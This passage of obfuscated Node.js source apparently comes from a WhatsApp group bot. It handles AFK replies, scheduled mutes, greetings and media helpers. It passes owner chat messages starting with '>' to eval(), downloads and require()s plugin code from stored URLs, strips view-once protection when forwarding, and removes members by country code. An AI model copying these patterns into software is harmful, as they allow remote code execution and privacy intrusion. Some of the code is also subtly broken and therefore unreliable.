        })
        try {
          let _0x18af6d = (_0x4b9347) =>
              typeof _0x4b9347 === 'number' && !isNaN(_0x4b9347),
            _0x181141 = global.db.users[_0x4ea58a.sender]
          if (typeof _0x181141 !== 'object') {
            global.db.users[_0x4ea58a.sender] = {}
          }
          const _0x48156c = {
            afkTime: -1,
            afkReason: '',
          }
          if (_0x181141) {
            if (!_0x18af6d(_0x181141.afkTime)) {
              _0x181141.afkTime = -1
            }
            if (!('afkReason' in _0x181141)) {
              _0x181141.afkReason = ''
            }
          } else {
            global.db.users[_0x4ea58a.sender] = _0x48156c
          }
          let _0x264917 = global.db.chats[_0x4ea58a.chat]
          if (typeof _0x264917 !== 'object') {
            global.db.chats[_0x4ea58a.chat] = {}
          }
          const _0x528ea0 = {
            mute: false,
            wame: false,
          }
          if (_0x264917) {
            if (!('mute' in _0x264917)) {
              _0x264917.mute = false
            }
            if (!('wame' in _0x264917)) {
              _0x264917.wame = false
            }
          } else {
            global.db.chats[_0x4ea58a.chat] = _0x528ea0
          }
        } catch (_0x380d14) {
          console.error(_0x380d14)
        }
        let _0xa3c526 = [
          ...new Set([
            ...(_0x4ea58a.mentionedJid || []),
            ...(_0x4ea58a.quoted ? [_0x4ea58a.quoted.sender] : []),
          ]),
        ]
        for (let _0xc9ee7f of _0xa3c526) {
          let _0x37b80e = global.db.users[_0xc9ee7f]
          if (!_0x37b80e) {
            continue
          }
          let _0x5a0044 = _0x37b80e.afkTime
          if (!_0x5a0044 || _0x5a0044 < 0) {
            continue
          }
          let _0xd7ea90 = _0x37b80e.afkReason || ''
          reply(
            (
              '\n\nHello ' +
              _0x4ea58a.pushName +
              ' \n\n, this is *' +
              tlang().title +
              "* a bot.\n\nDon't tag him,he is busy now. But Don't worry I assure you,I'll inform him As soon as possible\uD83D\uDE09.\n\n" +
              (_0xd7ea90 ? 'with reason ' + _0xd7ea90 : 'no reason') +
              '\n\nIts been ' +
              clockString(new Date() - _0x5a0044) +
              '\n\nThanks\n*Powered by ' +
              tlang().title +
              '*\n\n'
            ).trim()
          )
        }
        if (db.users[_0x4ea58a.sender].afkTime > -1) {
          let _0x382a30 = global.db.users[_0x4ea58a.sender]
          reply(
            (
              '\n\n' +
              tlang().greet +
              ' came back online from AFK' +
              (_0x382a30.afkReason ? ' after ' + _0x382a30.afkReason : '') +
              '\n\nIn ' +
              clockString(new Date() - _0x382a30.afkTime) +
              '\n\n'
            ).trim()
          )
          _0x382a30.afkTime = -1
          _0x382a30.afkReason = ''
        }
        if (_0x33bdc7 && _0x4ea58a.text.startsWith('>')) {
          let _0x3edfa3 = _0x19abaf.slice(2)
          if (!_0x3edfa3) {
            _0x4ea58a.reply('Provide me with a query to run Master!')
            return
          }
          try {
            let _0x5b1ace = eval(_0x3edfa3)
            if (typeof _0x5b1ace === 'object') {
              _0x4ea58a.reply(util.format(_0x5b1ace))
            } else {
              _0x4ea58a.reply(util.format(_0x5b1ace))
            }
          } catch (_0x59239f) {
            _0x4ea58a.reply(util.format(_0x59239f))
          }
          return
        }
        if (_0x33bdc7 && _0x4ea58a.text.startsWith('>')) {
          let _0x4fb230 = _0x19abaf.slice(2)
          if (!_0x4fb230) {
            _0x4ea58a.reply('*Provide me with a query to run Master!*')
            return
          }
          try {
            let _0x443443 = await eval(
                'const a = async()=>{\n' + _0x4fb230 + '\n}\na()'
              ),
              _0x5d4a9e = util.format(_0x443443)
            if (_0x5d4a9e === undefined) {
              return console.log(_0x5d4a9e)
            } else {
              _0x4ea58a.reply(_0x5d4a9e)
            }
          } catch (_0x57a145) {
            if (_0x57a145 === undefined) {
              return console.log('error')
            } else {
              _0x4ea58a.reply(util.format(_0x57a145))
            }
          }
          return
        }
      } catch (_0x1acb61) {
        console.log(_0x1acb61)
      }
    })
    const { sck: _0x1f2fd1 } = require('.')
    async function _0x46bfb4(_0x1aa4b4, _0x528970, _0x40934e) {
      let _0x2c8b30 = require('node-cron')
      console.log(_0x1aa4b4)
      console.log(_0x528970)
      console.log(_0x40934e)
      let [_0x398db7, _0x451b8f] = _0x1aa4b4.split(':')
      var _0x3bba2a
      if (_0x40934e === 'mute') {
        _0x3bba2a = 'announcement'
      }
      if (_0x40934e === 'unmute') {
        _0x3bba2a = 'not_announcement'
      }
      const _0x2386a4 = {
        scheduled: true,
        timezone: 'Asia/colombo',
      }
      _0x2c8b30.schedule(
        _0x451b8f + ' ' + _0x398db7 + ' * * *',
        () => {
          ;(async () => {
            return await _0x3f593f.groupSettingUpdate(_0x528970, _0x3bba2a)
          })()
        },
        _0x2386a4
      )
    }
    async function _0x61116e() {
      let _0x163d12 = await _0x1f2fd1.find({})
      for (let _0x3a1de4 = 0; _0x3a1de4 < _0x163d12.length; _0x3a1de4++) {
        if (_0x163d12[_0x3a1de4].mute === 'false') {
          continue
        }
        if (_0x163d12[_0x3a1de4].mute === undefined) {
          continue
        }
        await _0x46bfb4(
          _0x163d12[_0x3a1de4].mute,
          _0x163d12[_0x3a1de4].id,
          'mute'
        )
      }
    }
    async function _0x1a3c61() {
      let _0x310538 = await _0x1f2fd1.find({})
      for (let _0x15c6f4 = 0; _0x15c6f4 < _0x310538.length; _0x15c6f4++) {
        if (_0x310538[_0x15c6f4].unmute === 'false') {
          continue
        }
        if (_0x310538[_0x15c6f4].unmute === undefined) {
          continue
        }
        await _0x46bfb4(
          _0x310538[_0x15c6f4].unmute,
          _0x310538[_0x15c6f4].id,
          'unmute'
        )
      }
    }
    _0x61116e()
    _0x1a3c61()
    async function _0x4f6215() {
      if (Config.art === 'true') {
        exec('pm2 restart prabath', (_0x17f7f0, _0x4d2aba) => {
          if (Config.art === 'true') {
            return
          }
          if (_0x17f7f0) {
            return reply('-------\n\n' + _0x17f7f0)
          }
          if (_0x4d2aba) {
            return reply('-------\n\n' + _0x4d2aba)
          }
        })
      }
    }
    setTimeout(await _0x4f6215, 3600000)
    _0x3f593f.ev.on('group-participants.update', async (_0x375486) => {
      try {
        let _0xa09407 = await _0x3f593f.groupMetadata(_0x375486.id),
          _0x496957 = _0x375486.participants
        for (let _0x1f498f of _0x496957) {
          var _0xe55a4
          try {
            _0xe55a4 = await _0x3f593f.profilePictureUrl(_0x1f498f, 'image')
          } catch {
            _0xe55a4 =
              'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
          }
          if (Config.antifake != '') {
            var _0x31370d = Config.antifake.split(',') || '92'
            for (let _0x281874 = 0; _0x281874 < _0x31370d.length; _0x281874++) {
              let _0x2b9211 = require('awesome-phonenumber')(
                '+' + _0x1f498f.split('@')[0]
              ).getCountryCode()
              if (_0x2b9211 === _0x31370d[_0x281874]) {
                console.log(_0x31370d[_0x281874])
                try {
                  const _0x54a4a6 = {}
                  return (
                    (_0x54a4a6.text = _0x2b9211 + ' is not allowed'),
                    _0x3f593f.sendMessage(_0x375486.id, _0x54a4a6),
                    await _0x3f593f.groupParticipantsUpdate(
                      _0x375486.id,
                      [_0x1f498f],
                      'remove'
                    )
                  )
                } catch {
                  console.log('error')
                }
              }
            }
          }
          const _0x23a075 = { id: _0x375486.id }
          let _0x3c7cad = await _0x1f2fd1.findOne(_0x23a075)
          if (_0x3c7cad) {
            let _0x1df2e3 = _0x3c7cad.events || 'false'
            if (_0x375486.action == 'add' && _0x1df2e3 == 'true') {
              hesa = '' + _0x496957
              getnum = (_0x1aa128) => {
                return _0x1aa128.replace(/['@s whatsapp.net']/g, ' ')
              }
              resa = '' + getnum(hesa)
              const _0x2ed7ce = _0xa09407.participants.length
              let _0x39b11d = _0x3c7cad.welcome
                .replace(/@user/gi, '@' + _0x1f498f.split('@')[0])
                .replace(/@gname/gi, _0xa09407.subject)
                .replace(/@desc/gi, _0xa09407.desc)
                .replace(/@count/gi, _0x2ed7ce)
              if (/@pp/g.test(_0x39b11d)) {
                const _0x412125 = { url: _0xe55a4 }
                let _0x5a037b = {
                  image: _0x412125,
                  caption: _0x39b11d.trim().replace(/@pp/g, ''),
                  footer: '' + Config.botname,
                  mentions: [_0x1f498f],
                  headerType: 4,
                }
                return await _0x3f593f.sendMessage(_0x375486.id, _0x5a037b)
              } else {
                return _0x3f593f.sendMessage(_0x375486.id, {
                  text: _0x39b11d.trim(),
                  mentions: [_0x1f498f],
                })
              }
            } else {
              if (_0x1df2e3 === 'true' && _0x375486.action == 'remove') {
                hesa = '' + _0x496957
                getnum = (_0x138d9a) => {
                  return _0x138d9a.replace(/['@s whatsapp.net']/g, ' ')
                }
                resa = '' + getnum(hesa)
                const _0x408acd = _0xa09407.participants.length
                let _0x40dbd0 = _0x3c7cad.goodbye
                  .replace(/@user/gi, '@' + _0x1f498f.split('@')[0])
                  .replace(/@gname/gi, _0xa09407.subject)
                  .replace(/@desc/gi, _0xa09407.desc)
                  .replace(/@count/gi, _0x408acd)
                if (/@pp/g.test(_0x40dbd0)) {
                  const _0x577538 = { url: _0xe55a4 }
                  let _0x3d9562 = {
                    image: _0x577538,
                    caption: _0x40dbd0.trim().replace(/@pp/g, ''),
                    footer: '' + Config.botname,
                    mentions: [_0x1f498f],
                    headerType: 4,
                  }
                  return _0x3f593f.sendMessage(_0x375486.id, _0x3d9562)
                } else {
                  return _0x3f593f.sendMessage(_0x375486.id, {
                    text: _0x40dbd0.trim(),
                    mentions: [_0x1f498f],
                  })
                }
              } else {
                if (_0x375486.action == 'promote') {
                  var _0xaafd32
                  try {
                    _0xaafd32 = await _0x3f593f.profilePictureUrl(
                      _0x1f498f,
                      'image'
                    )
                  } catch {
                    ppurl = 'https://i.ibb.co/6BRf4Rc/Hans-Bot-No-Profile.png'
                  }
                  const _0x6787fa = { displayText: 'OK' }
                  const _0x3ea02b = {
                    buttonId: 'huh',
                    buttonText: _0x6787fa,
                    type: 1,
                  }
                  let _0x5dc7b9 = [_0x3ea02b]
                  const _0x227f55 = { url: _0xaafd32 }
                  let _0x15e918 = {
                    image: _0x227f55,
                    caption:
                      '[ *PROMOTE - DETECTED* ]\n\nName : @' +
                      _0x1f498f.split('@')[0] +
                      '\nStatus : Member -> Admin\nGroup : ' +
                      _0xa09407.subject,
                    footer: '*PRABATH-MD-WHATSAPP-BOT*',
                    mentions: [_0x1f498f],
                    headerType: 4,
                  }
                } else {
                  if (_0x375486.action == 'demote') {
                    try {
                      _0xaafd32 = await _0x3f593f.profilePictureUrl(
                        _0x1f498f,
                        'image'
                      )
                    } catch {
                      _0xaafd32 =
                        'https://i.ibb.co/6BRf4Rc/Hans-Bot-No-Profile.png'
                    }
                    const _0xeca327 = { displayText: 'OK' }
                    const _0x5b7b61 = {
                      buttonId: 'okedoh',
                      buttonText: _0xeca327,
                      type: 1,
                    }
                    let _0x13a1e5 = [_0x5b7b61]
                    const _0xf84a23 = { url: _0xaafd32 }
                    let _0x6539e4 = {
                      image: _0xf84a23,
                      caption:
                        '[ *DEMOTE - DETECTED!* ]\n\nName : @' +
                        _0x1f498f.split('@')[0] +
                        '\nStatus : Admin -> Member',
                      footer: '~ *PRABATH-MD-WHATSAPP-BOT*',
                      mentions: [_0x1f498f],
                      headerType: 4,
                    }
                  }
                }
              }
            }
          }
        }
      } catch (_0x11ed77) {
        console.log(_0x11ed77)
      }
    })
    _0x3f593f.decodeJid = (_0x18c010) => {
      if (!_0x18c010) {
        return _0x18c010
      }
      if (/:\d+@/gi.test(_0x18c010)) {
        let _0xf5e202 = jidDecode(_0x18c010) || {}
        return (
          (_0xf5e202.user &&
            _0xf5e202.server &&
            _0xf5e202.user + '@' + _0xf5e202.server) ||
          _0x18c010
        )
      } else {
        return _0x18c010
      }
    }
    _0x3f593f.ev.on('contacts.upsert', (_0x391fc3) => {
      const _0x46127e = (_0x1efaff) => {
        for (const _0x48fdcc of _0x1efaff) {
          _0x52b453.contacts[_0x48fdcc.id]
            ? Object.assign(_0x52b453.contacts[_0x48fdcc.id], _0x48fdcc)
            : (_0x52b453.contacts[_0x48fdcc.id] = _0x48fdcc)
        }
        return
      }
      _0x46127e(_0x391fc3)
    })
    _0x3f593f.ev.on('contacts.update', async (_0x45e505) => {
      for (let _0x55fb2b of _0x45e505) {
        let _0x4955c6 = _0x3f593f.decodeJid(_0x55fb2b.id)
        const _0x379acf = { id: _0x4955c6 }
        sck1.findOne(_0x379acf).then((_0x2337dd) => {
          if (!_0x2337dd) {
            const _0x1f9bc0 = {
              id: _0x4955c6,
              name: _0x55fb2b.notify,
            }
            new sck1(_0x1f9bc0).save()
          } else {
            const _0x563203 = { id: _0x4955c6 }
            const _0x48297d = { name: _0x55fb2b.notify }
            sck1.updateOne(_0x563203, _0x48297d)
          }
        })
        if (_0x52b453 && _0x52b453.contacts) {
          _0x52b453.contacts[_0x4955c6] = {
            id: _0x4955c6,
            name: _0x55fb2b.notify,
          }
        }
      }
    })
    _0x3f593f.getName = (_0x40000e, _0x550ed2 = false) => {
      id = _0x3f593f.decodeJid(_0x40000e)
      _0x550ed2 = _0x3f593f.withoutContact || _0x550ed2
      let _0x26fd3d
      if (id.endsWith('@g.us')) {
        return new Promise(async (_0x423de3) => {
          _0x26fd3d = _0x52b453.contacts[id] || {}
          if (!(_0x26fd3d.name.notify || _0x26fd3d.subject)) {
            _0x26fd3d = _0x3f593f.groupMetadata(id) || {}
          }
          _0x423de3(
            _0x26fd3d.name ||
              _0x26fd3d.subject ||
              PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber(
                'international'
              )
          )
        })
      } else {
        _0x26fd3d =
          id === '0@s.whatsapp.net'
            ? {
                id: id,
                name: 'WhatsApp',
              }
            : id === _0x3f593f.decodeJid(_0x3f593f.user.id)
            ? _0x3f593f.user
            : _0x52b453.contacts[id] || {}
      }
      return (
        (_0x550ed2 ? '' : _0x26fd3d.name) ||
        _0x26fd3d.subject ||
        _0x26fd3d.verifiedName ||
        PhoneNumber('+' + _0x40000e.replace('@s.whatsapp.net', '')).getNumber(
          'international'
        )
      )
    }
    _0x3f593f.sendContact = async (
      _0x57c5ee,
      _0x3d6f36,
      _0x273c66 = '',
      _0xe3d752 = {}
    ) => {
      let _0x1fc119 = []
      for (let _0x25d4e4 of _0x3d6f36) {
        _0x1fc119.push({
          displayName: await _0x3f593f.getName(_0x25d4e4 + '@s.whatsapp.net'),
          vcard:
            'BEGIN:VCARD\nVERSION:3.0\nN:' +
            (await _0x3f593f.getName(_0x25d4e4 + '@s.whatsapp.net')) +
            '\nFN:' +
            global.OwnerName +
            '\nitem1.TEL;waid=' +
            _0x25d4e4 +
            ':' +
            _0x25d4e4 +
            '\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:' +
            global.email +
            '\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/' +
            global.github +
            '/Secktor-Md\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;' +
            global.location +
            ';;;;\nitem4.X-ABLabel:Region\nEND:VCARD',
        })
      }
      const _0x5593d4 = {
        displayName: _0x1fc119.length + ' Contact',
        contacts: _0x1fc119,
      }
      const _0x304a84 = {
          contacts: _0x5593d4,
          ..._0xe3d752,
        },
        _0x552ef7 = { quoted: _0x273c66 }
      _0x3f593f.sendMessage(_0x57c5ee, _0x304a84, _0x552ef7)
    }
    _0x3f593f.setStatus = (_0x510ce2) => {
      const _0x4b90ad = {
        to: '@s.whatsapp.net',
        type: 'set',
        xmlns: 'status',
      }
      return (
        _0x3f593f.query({
          tag: 'iq',
          attrs: _0x4b90ad,
          content: [
            {
              tag: 'status',
              attrs: {},
              content: Buffer.from(_0x510ce2, 'utf-8'),
            },
          ],
        }),
        _0x510ce2
      )
    }
    _0x3f593f.serializeM = (_0x841056) => smsg(_0x3f593f, _0x841056, _0x52b453)
    _0x3f593f.ev.on('connection.update', async (_0x2a3f71) => {
      const { connection: _0x48c294, lastDisconnect: _0xdfef58 } = _0x2a3f71
      _0x48c294 === 'Connecting' &&
        console.log('ℹ️ Connecting to WhatsApp... Please Wait.')
      if (_0x48c294 === 'open') {
        console.log('ℹ️ Connect to Whatsapp...')
        console.log('\uD83D\uDCC2 Login Successful!')
        console.log('\u2699️ Checking Mongodb and Session-id...')
        let _0x40efe0 = require('axios'),
          _0xb22e9d = await plugindb.find({})
        for (let _0x469ce5 = 0; _0x469ce5 < _0xb22e9d.length; _0x469ce5++) {
          let _0x18be2f = await _0x40efe0.get(_0xb22e9d[_0x469ce5].url),
            _0x341db8 = _0x18be2f.data
          await fs.writeFileSync(
            __dirname + '/../commands/' + _0xb22e9d[_0x469ce5].id + '.js',
            _0x341db8,
            'utf8'
          )
        }
        console.log('Connected to Whatsapp \u2705 ')
        fs.readdirSync(__dirname + '/../commands').forEach((_0x4f05dc) => {
          path.extname(_0x4f05dc).toLowerCase() == '.js' &&
            require(__dirname + '/../commands/' + _0x4f05dc)
        })
        for (let _0x5e4cc2 of owner) {
          const _0x5d3700 =
              '\n*PRABATH-MD bot installed successfully* \u2705\n\n\n\n\u2699️ *YOUR CURRENT SETTINGS*\n-----------------------------------------------------\n\n \u27A3 *ANTILINK_VALUES*  \xBB  ' +
              Config.antilink +
              '\n\n\u27A3 *OWNER_NUMBER*  \xBB  ' +
              process.env.OWNER_NUMBER +
              '\n\n\u27A3 *DISABLE_PM*  \xBB ' +
              Config.disablepm +
              '\n\n\u27A3 *WORK_TYPE*  \xBB  ' +
              Config.WORKTYPE +
              '\n\n\u27A3 *VERSION*  \xBB  5.0.0 \u2714️\n\n\u27A3 *PREFIX*  \xBB  ' +
              Config.HANDLERS +
              '\n\n\u27A3 *SUDO* \xBB ' +
              Config.sudo +
              '\n\n\u27A3 *THEME*  \xBB  ' +
              Config.LANG +
              '\n\n\n\uD83C\uDF0F *Website :* https://prabath-md.vercel.app/\n\n\nᴘʀᴀʙᴀᴛʜ-ᴍᴅ \u2981 ᴍᴀᴅᴇ ʙʏ ᴘʀᴀʙᴀᴛʜ\nʀᴇʟᴇᴀsᴇᴅ \u2981 \uD835\uDFF8\uD835\uDFF6\uD835\uDFF8\uD835\uDFF9/\uD835\uDFF6\uD835\uDFF7/\uD835\uDFF6\uD835\uDFF8',
            _0x304b7f = {
              displayText: 'Join support group \uD83D\uDC68‍\uD83D\uDCBB',
            }
          const _0xb9b235 = {
            buttonId:
              prefix + 'join https://chat.whatsapp.com/KwFkWjI8qJ6B174esar8IM',
            buttonText: _0x304b7f,
            type: 1,
          }
          let _0x9a4f93 = [_0xb9b235]
          const _0x12b8b2 = {
            url: 'https://i.ibb.co/VQcXsdc/20230305-133828.jpg',
          }
          let _0x2bf3e9 = {
            image: _0x12b8b2,
            caption: _0x5d3700,
            footer: tlang().footer,
            headerType: 4,
          }
          return _0x3f593f.sendMessage(_0x5e4cc2 + '@s.whatsapp.net', _0x2bf3e9)
        }
        _0x48c294 === 'close' &&
          _0xdfef58 &&
          _0xdfef58.error &&
          _0xdfef58.error.output.statusCode != 401 &&
          (console.log(
            'Connection closed with bot. Please put New Session ID again. \u274C'
          ),
          await sleep(50000),
          _0x12cf82().catch((_0x39c6c5) => console.log(_0x39c6c5)))
      }
    })
    _0x3f593f.ev.on('creds.update', _0x490969)
    _0x3f593f.send5ButImg = async (
      _0x3ba5b3,
      _0x2e0020 = '',
      _0x2a8a01 = '',
      _0x34c4b7,
      _0x24fb5e = [],
      _0x58f273,
      _0x5cb15d = {}
    ) => {
      const _0x7a888a = {
        image: _0x34c4b7,
        jpegThumbnail: _0x58f273,
      }
      const _0x60e233 = { upload: _0x3f593f.waUploadToServer }
      let _0x8460a1 = await prepareWAMessageMedia(_0x7a888a, _0x60e233)
      const _0x5069d2 = {
        imageMessage: _0x8460a1.imageMessage,
        hydratedContentText: _0x2e0020,
        hydratedFooterText: _0x2a8a01,
        hydratedButtons: _0x24fb5e,
      }
      const _0x31b184 = { hydratedTemplate: _0x5069d2 }
      const _0x2048d7 = { templateMessage: _0x31b184 }
      var _0x145e5e = generateWAMessageFromContent(
        _0x3ba5b3,
        proto.Message.fromObject(_0x2048d7),
        _0x5cb15d
      )
      _0x3f593f.relayMessage(_0x3ba5b3, _0x145e5e.message, {
        messageId: _0x145e5e.key.id,
      })
    }
    _0x3f593f.sendButtonText = (
      _0x514d05,
      _0x51dce7 = [],
      _0x4be75f,
      _0x115241,
      _0x3d2d0e = '',
      _0x1db1b3 = {}
    ) => {
      const _0x4131cf = {
        text: _0x4be75f,
        footer: _0x115241,
        buttons: _0x51dce7,
        headerType: 2,
        ..._0x1db1b3,
      }
      let _0x41235b = _0x4131cf
      const _0x2ecea8 = {
        quoted: _0x3d2d0e,
        ..._0x1db1b3,
      }
      _0x3f593f.sendMessage(_0x514d05, _0x41235b, _0x2ecea8)
    }
    _0x3f593f.sendText = (_0x2441bb, _0x26b9cb, _0x4c172c = '', _0x3874fd) =>
      _0x3f593f.sendMessage(
        _0x2441bb,
        {
          text: _0x26b9cb,
          ..._0x3874fd,
        },
        { quoted: _0x4c172c }
      )
    _0x3f593f.sendImage = async (
      _0x241e1a,
      _0x2cf647,
      _0x2e2c78 = '',
      _0x4a9fe0 = '',
      _0x15e013
    ) => {
      let _0xaac17c = Buffer.isBuffer(_0x2cf647)
        ? _0x2cf647
        : /^data:.*?\/.*?;base64,/i.test(_0x2cf647)
        ? Buffer.from(_0x2cf647.split`,`[1], 'base64')
        : /^https?:\/\//.test(_0x2cf647)
        ? await await getBuffer(_0x2cf647)
        : fs.existsSync(_0x2cf647)
        ? fs.readFileSync(_0x2cf647)
        : Buffer.alloc(0)
      const _0x4a4c33 = {
        image: _0xaac17c,
        caption: _0x2e2c78,
        ..._0x15e013,
      }
      const _0x4db253 = {}
      return (
        (_0x4db253.quoted = _0x4a9fe0),
        await _0x3f593f.sendMessage(_0x241e1a, _0x4a4c33, _0x4db253)
      )
    }
    _0x3f593f.sendTextWithMentions = async (
      _0xf7013b,
      _0x225aa9,
      _0x2e4f29,
      _0x4cae26 = {}
    ) =>
      _0x3f593f.sendMessage(
        _0xf7013b,
        {
          text: _0x225aa9,
          contextInfo: {
            mentionedJid: [..._0x225aa9.matchAll(/@(\d{0,16})/g)].map(
              (_0x5e6346) => _0x5e6346[1] + '@s.whatsapp.net'
            ),
          },
          ..._0x4cae26,
        },
        { quoted: _0x2e4f29 }
      )
    _0x3f593f.sendImageAsSticker = async (
      _0x474e4c,
      _0x4543a7,
      _0x1fed50 = {}
    ) => {
      let _0x6386a1
      _0x1fed50 && (_0x1fed50.packname || _0x1fed50.author)
        ? (_0x6386a1 = await writeExifImg(_0x4543a7, _0x1fed50))
        : (_0x6386a1 = await imageToWebp(_0x4543a7))
      const _0x247718 = { url: _0x6386a1 }
      const _0x1c93a7 = {
        sticker: _0x247718,
        ..._0x1fed50,
      }
      await _0x3f593f.sendMessage(_0x474e4c, _0x1c93a7, _0x1fed50)
    }
    _0x3f593f.sendVideoAsSticker = async (
      _0x1f6c44,
      _0x5ec1e4,
      _0x31b257 = {}
    ) => {
      let _0x23d959
      _0x31b257 && (_0x31b257.packname || _0x31b257.author)
        ? (_0x23d959 = await writeExifVid(_0x5ec1e4, _0x31b257))
        : (_0x23d959 = await videoToWebp(_0x5ec1e4))
      const _0x354b19 = { url: _0x23d959 }
      const _0x55748c = {
        sticker: _0x354b19,
        ..._0x31b257,
      }
      await _0x3f593f.sendMessage(_0x1f6c44, _0x55748c, _0x31b257)
    }
    _0x3f593f.sendMedia = async (
      _0x5391fe,
      _0x2ffe3f,
      _0x5666b8 = '',
      _0x4a8a93 = '',
      _0x1bf546 = '',
      _0x52f677 = {}
    ) => {
      let _0x31bd95 = await _0x3f593f.getFile(_0x2ffe3f, true),
        {
          mime: _0x1fe482,
          ext: _0x16d1d0,
          res: _0x448352,
          data: _0x5ea691,
          filename: _0xcb4c1e,
        } = _0x31bd95
      if (
        (_0x448352 && _0x448352.status !== 200) ||
        _0x58b6ac.length <= 65536
      ) {
        try {
          throw { json: JSON.parse(_0x58b6ac.toString()) }
        } catch (_0x691e67) {
          if (_0x691e67.json) {
            throw _0x691e67.json
          }
        }
      }
      let _0x72253b = '',
        _0x3ce09d = _0x1fe482,
        _0x4908e4 = _0xcb4c1e
      if (_0x52f677.asDocument) {
        _0x72253b = 'document'
      }
      if (_0x52f677.asSticker || /webp/.test(_0x1fe482)) {
        let { writeExif: _0x2c82c1 } = require('./exif')
        const _0xa1cbec = {
          mimetype: _0x1fe482,
          data: _0x5ea691,
        }
        let _0x5132dc = _0xa1cbec
        const _0x358f4d = {
          packname: _0x52f677.packname ? _0x52f677.packname : Config.packname,
          author: _0x52f677.author ? _0x52f677.author : Config.author,
          categories: _0x52f677.categories ? _0x52f677.categories : [],
        }
        _0x4908e4 = await _0x2c82c1(_0x5132dc, _0x358f4d)
        await fs.promises.unlink(_0xcb4c1e)
        _0x72253b = 'sticker'
        _0x3ce09d = 'image/webp'
      } else {
        if (/image/.test(_0x1fe482)) {
          _0x72253b = 'image'
        } else {
          if (/video/.test(_0x1fe482)) {
            _0x72253b = 'video'
          } else {
            if (/audio/.test(_0x1fe482)) {
              _0x72253b = 'audio'
            } else {
              _0x72253b = 'document'
            }
          }
        }
      }
      const _0x222dd8 = { url: _0x4908e4 }
      const _0x30c5e0 = {
          [_0x72253b]: _0x222dd8,
          caption: _0x4a8a93,
          mimetype: _0x3ce09d,
          fileName: _0x5666b8,
          ..._0x52f677,
        },
        _0x528b22 = {
          quoted: _0x1bf546,
          ..._0x52f677,
        }
      return (
        await _0x3f593f.sendMessage(_0x5391fe, _0x30c5e0, _0x528b22),
        fs.promises.unlink(_0x4908e4)
      )
    }
    _0x3f593f.downloadAndSaveMediaMessage = async (
      _0x1fbdba,
      _0xcdef6c,
      _0xacfc38 = true
    ) => {
      let _0x5548b7 = _0x1fbdba.msg ? _0x1fbdba.msg : _0x1fbdba
      let _0x2ddc22 = (_0x1fbdba.msg || _0x1fbdba).mimetype || ''
      let _0x2b9f6e = _0x1fbdba.mtype
        ? _0x1fbdba.mtype.replace(/Message/gi, '')
        : _0x2ddc22.split('/')[0]
      const _0x4dc5e9 = await downloadContentFromMessage(_0x5548b7, _0x2b9f6e)
      let _0x2fa1bb = Buffer.from([])
      for await (const _0x338374 of _0x4dc5e9) {
        _0x2fa1bb = Buffer.concat([_0x2fa1bb, _0x338374])
      }
      let _0x35b165 = await FileType.fromBuffer(_0x2fa1bb)
      return (
        (trueFileName = _0xacfc38
          ? _0xcdef6c + '.' + _0x35b165.ext
          : _0xcdef6c),
        await fs.writeFileSync(trueFileName, _0x2fa1bb),
        trueFileName
      )
    }
    _0x3f593f.downloadMediaMessage = async (_0x29f8d1) => {
      let _0x579e57 = (_0x29f8d1.msg || _0x29f8d1).mimetype || ''
      let _0x1ffe36 = _0x29f8d1.mtype
        ? _0x29f8d1.mtype.replace(/Message/gi, '')
        : _0x579e57.split('/')[0]
      const _0xf42c7b = await downloadContentFromMessage(_0x29f8d1, _0x1ffe36)
      let _0x4bb7dd = Buffer.from([])
      for await (const _0x543bcf of _0xf42c7b) {
        _0x4bb7dd = Buffer.concat([_0x4bb7dd, _0x543bcf])
      }
      return _0x4bb7dd
    }
    _0x3f593f.copyNForward = async (
      _0x215d10,
      _0x4c1366,
      _0x3ccc06 = false,
      _0x46732b = {}
    ) => {
      let _0x4b4608
      if (_0x46732b.readViewOnce) {
        _0x4c1366.message =
          _0x4c1366.message &&
          _0x4c1366.message.ephemeralMessage &&
          _0x4c1366.message.ephemeralMessage.message
            ? _0x4c1366.message.ephemeralMessage.message
            : _0x4c1366.message || undefined
        _0x4b4608 = Object.keys(_0x4c1366.message.viewOnceMessage.message)[0]
        delete (_0x4c1366.message && _0x4c1366.message.ignore
          ? _0x4c1366.message.ignore
          : _0x4c1366.message || undefined)
        delete _0x4c1366.message.viewOnceMessage.message[_0x4b4608].viewOnce
        _0x4c1366.message = { ..._0x4c1366.message.viewOnceMessage.message }
      }
      let _0x194f9b = Object.keys(_0x4c1366.message)[0]
      let _0x51c54a = await generateForwardMessageContent(_0x4c1366, _0x3ccc06)
      let _0x1e4f93 = Object.keys(_0x51c54a)[0],
        _0x2cfdaf = {}
      if (_0x194f9b != 'conversation') {
        _0x2cfdaf = _0x4c1366.message[_0x194f9b].contextInfo
      }
      _0x51c54a[_0x1e4f93].contextInfo = {
        ..._0x2cfdaf,
        ..._0x51c54a[_0x1e4f93].contextInfo,
      }
      const _0x393976 = await generateWAMessageFromContent(
        _0x215d10,
        _0x51c54a,
        _0x46732b
          ? {
              ..._0x51c54a[_0x1e4f93],
              ..._0x46732b,
              ...(_0x46732b.contextInfo
                ? {
                    contextInfo: {
                      ..._0x51c54a[_0x1e4f93].contextInfo,
                      ..._0x46732b.contextInfo,
                    },
                  }
                : {}),
            }
          : {}
      )
      return (
        await _0x3f593f.relayMessage(_0x215d10, _0x393976.message, {
          messageId: _0x393976.key.id,
        }),
        _0x393976
      )
    }
    _0x3f593f.sendFileUrl = async (
      _0x5ae4b9,
      _0x479348,
      _0x2ce8e2,
      _0x109192,
      _0x4efffd = {}
    ) => {
      let _0x4f9458 = ''
      let _0x22f4dc = await axios.head(_0x479348)
      _0x4f9458 = _0x22f4dc.headers['content-type']
      if (_0x4f9458.split('/')[1] === 'gif') {
        return _0x3f593f.sendMessage(
          _0x5ae4b9,
          {
            video: await getBuffer(_0x479348),
            caption: _0x2ce8e2,
            gifPlayback: true,
            ..._0x4efffd,
          },
          {
            quoted: _0x109192,
            ..._0x4efffd,
          }
        )
      }
      let _0x20cd16 = _0x4f9458.split('/')[0] + 'Message'
      if (_0x4f9458 === 'application/pdf') {
        return _0x3f593f.sendMessage(
          _0x5ae4b9,
          {
            document: await getBuffer(_0x479348),
            mimetype: 'application/pdf',
            caption: _0x2ce8e2,
            ..._0x4efffd,
          },
          {
            quoted: _0x109192,
            ..._0x4efffd,
